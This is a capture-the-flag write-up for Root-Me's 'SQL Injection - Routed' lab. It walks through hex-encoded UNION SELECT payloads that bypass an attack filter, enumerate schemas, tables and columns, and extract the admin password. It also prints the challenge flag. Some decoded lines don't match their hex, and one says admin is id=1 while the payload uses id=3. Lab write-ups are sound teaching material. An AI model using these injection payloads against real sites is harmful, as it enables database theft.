## Challenge name: SQL Injection - Routed


<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/596cdcb2-9e47-4192-931d-df58b1fc3245" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed?lang=en&sens_co=1&tri_co=id_mo](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed?lang=en&sens_co=1&tri_co=id_mo)
<br>
<br>

**After starting the challenge we can see that there is login page and search page wehre we can login and search users form database..**

<br>
<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/cb10c6c4-9f6f-4afb-a8d4-7ba2413cbb83" />
<br><br>
<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/fc9030f5-b409-4a30-a1df-2ba29eeab650" />
<br><br>
<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/7123b76a-7e3b-4293-92b6-f2dc84934b17" />
<br>
<br>

**And after that if we put a quote at the searching place it gives an error so that's when we know where we have to test things further..**

<br>
<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/eb932551-994b-4361-99c6-5389a40115a6" />
<br>
<br>

**So as the challenge suggests sql injection but routed it means our query is not directly going but is passed (routed) through application logic, layers, or multiple endpoints before reaching the database maybe some kind of filterization lets see..**

<br>
<img width="1308" height="333" alt="image" src="https://github.com/user-attachments/assets/d3851ce8-d4ae-4cf6-b9be-845186d8f530" />
<br>
<br>

**I was trying some payload and inded it says attack detected so some kind of filterization is going on in there and also I noted that when we give some good sql query and numbers inside it and so on it says attack detected lets try encoading it in hex. Lets try this payload:**
<br><br>
```
Payload:
-3' UNION SELECT SLEEP(6),1 --

In hex:
0x2d332720554e494f4e2053454c45435420534c4545502836292c31202d2d20

Final payload for first try:
login=-3'+UNION+SELECT+0x2d332720554e494f4e2053454c45435420534c4545502836292c31202d2d20+--+
```

<br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/533e4263-eaef-4405-80fd-f4f927be4ce8" />
<br><br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/40cdfdbd-30d5-447d-8628-e4b2a450a1cf" />
<br>
<br>

**And it works and it sleeps for 6 sec and then sends reply back form server and you may have doubt like `0x2d332720554e494f4e2053454c45435420534c4545502836292c31202d2d20` itself is `-3' UNION SELECT SLEEP(6),1 -- ` so why are we giving 2 union selects like: `-3' UNION SELECT 0x2d332720554e494f4e2053454c45435420534c4545502836292c31202d2d20 --` and why is there -3 in the front.**
<br><br>
```
//Maybe the eg backend query looks somethin like:
SELECT id, email FROM users WHERE username = '$input';
//SQL is dynamically typed lang when is a valid string like admin or 1 or 3 whatever Query remains logically valid but,
//When MySQL sees: '-3' the query context expects comparison or evaluation, it may cast it to: -3 which may cause:
//1) Type mismatch
//2) No row match
//3) But query continues execution and also UNION output becomes visible so we use it..

```

<br>

**Also there aren’t two UNION SELECTs at execution time. One is just text encoded as hex so it bypasses filters; the database decodes it back into SQL before execution.**

```
//The lab is doing something like:
PREPARE stmt FROM <user_input>;
EXECUTE stmt;
//or maybe somethin like:
EXECUTE(<user_input>);
Payload: -3' UNION SELECT 0x2d332720554e494f4e2053454c45435420534c4545502836292c31202d2d20 --  // hex encoaded part is treated as a string literal
// SQL SELECT needs expressions and this -3' UNION SELECT <expr>, <expr> --syntax and is executed directly.
// So the flow becomes: UNION SELECT " -3' UNION SELECT SLEEP(6),1 -- ", 1
// This was an example where I tryed to explan how it maybe in backend according to what I know while solving lab as I am learning but it works so lets cont..
```
<br><br>
**So now lets list the databes using sql injection using this payload:**
<br><br>
```
Payload: 0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e534348454d41544129205748455245202840612920494e202840613a3d636f6e6361742840612c20534348454d415f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20

Decoaded: -3' UNION SELECT (SELECT (@a) FROM (SELECT (@a:=0x0)), (SELECT (@a) FROM (information_schema.SCHEMATA) WHERE (@a) IN (@a:=concat(@a, SCHEMA_NAME, '<br />')))) AS a),NULL --

Breaking it down:
-3' UNION SELECT ... → starts a SQL injection to bypass certain conditions.
SELECT (@a:=0x0) → initializes a variable @a.
SELECT (@a) FROM (information_schema.SCHEMATA) → loops through database schemas.
(@a:=concat(@a, SCHEMA_NAME, '<br />')) → concatenates schema names into @a, separated by HTML line breaks.
AS a), NULL -- → finalizes the union select, null padding, and comment to ignore rest of query.

Final Payload:
login=-3'+UNION+SELECT+0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e534348454d41544129205748455245202840612920494e202840613a3d636f6e6361742840612c20534348454d415f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20+--+
```

<br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/18be3d83-6d33-41b2-94a4-226b50dacf87" />
<br>
<br>

**We got the database name as `c_webserveur_49` so let us list tables form it using payload:**
<br><br>
```
Payload: 0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e5441424c455329205748455245202840612920494e202840613a3d636f6e6361742840612c205441424c455f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20

Decoaded: -3' UNION SELECT (SELECT (@a) FROM (SELECT (@a:=0x0)), (SELECT (@a) FROM (information_schema.TABLES) WHERE (@a) IN (@a:=concat(@a, TABLE_NAME, '<br />')))) AS a),NULL --

Breaking it down:
Initializes a session variable @a.
Iterates over information_schema.TABLES.
Concatenates all table names into a single output using concat.
Uses <br /> as a delimiter for clean HTML rendering.
Ends with -- to comment out the rest of the original query.

Final Payload:
login=-3'+UNION+SELECT+0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e5441424c455329205748455245202840612920494e202840613a3d636f6e6361742840612c205441424c455f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20+--+
```

<br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/27598272-97bc-48a1-a486-cef1c3a05a02" />
<br>
<br>

**From previous output we found that table name called `users` so lets list its tables usign this:**
<br><br>
```
Payload: 0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e434f4c554d4e5329205748455245202840612920494e202840613a3d636f6e6361742840612c20434f4c554d4e5f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20

Decoaded: -3' UNION SELECT (SELECT (@a) FROM (SELECT (@a:=0x0)), (SELECT (@a) FROM (information_schema.TABLES) WHERE (@a) IN (@a:=concat(@a, TABLE_NAME, '<br />')))) AS a),NULL --

Breaking it down:
Initializes a session variable @a.
Iterates over information_schema.TABLES.
Concatenates all table names into a single output using concat.
Uses <br /> as a delimiter for clean HTML rendering.
Ends with -- to comment out the rest of the original query.

Final Payload:
login=-3'+UNION+SELECT+0x2d332720554e494f4e2053454c454354202853454c45435420284061292046524f4d202853454c454354202840613a3d30783030292c202853454c45435420284061292046524f4d2028696e666f726d6174696f6e5f736368656d612e434f4c554d4e5329205748455245202840612920494e202840613a3d636f6e6361742840612c20434f4c554d4e5f4e414d452c20273c6272202f3e27292929292041532061292c4e554c4c202d2d20+--+
```

<br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/3323768c-b41d-421a-8df7-1d5afed8d7f4" />
<br>
<br>

**After a lots of junk at last we can see the actual fields as `id`, `login`, `email`, `password` so now lets get password from `users` table where `id=1` (admin user) using:**
<br><br>
```
Payload: 0x2d332720554e494f4e2053454c4543542070617373776f72642c312046524f4d2075736572732057484552452069643d33202d2d20

Decoaded: -3' UNION SELECT password,1 FROM users WHERE id=3 --

Final Payload: login=-3'+UNION+SELECT+0x2d332720554e494f4e2053454c4543542070617373776f72642c312046524f4d2075736572732057484552452069643d33202d2d20+--+
```

<br>
<img width="1642" height="942" alt="image" src="https://github.com/user-attachments/assets/92e613e4-89a9-471f-94f8-113a67cd432b" />
<br>
<br>

**And there we go we got admin password and we can use this "qs89QdAs9A" as flag/passwd to validate the challenge..** <br>
**Thankyou.**
